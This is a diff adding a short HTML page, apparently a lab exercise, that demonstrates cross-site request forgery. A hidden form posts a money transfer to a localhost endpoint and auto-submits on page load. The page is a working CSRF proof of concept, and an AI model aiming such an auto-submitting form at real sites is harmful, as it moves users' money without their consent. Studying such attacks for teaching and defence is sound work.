@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Attack Page</title>
+</head>
+
+
+<body>
+    <h1>CSRF Attack Simulation</h1>
+    <p>This page simulates a CSRF attack by submitting a hidden form to transfer money without user consent.</p>
+    
+    <form id="csrfForm" action="http://localhost/transfer_money" method="POST" style="display:none;">
+        <input type="hidden" name="recipient" value="thien">
+        <input type="hidden" name="amount" value="10">
+    </form>
+    
+    <script>
+        // Automatically submit the form to simulate the CSRF attack
+        document.getElementById('csrfForm').submit();
+    </script>
+
+</body>
+
+</html>
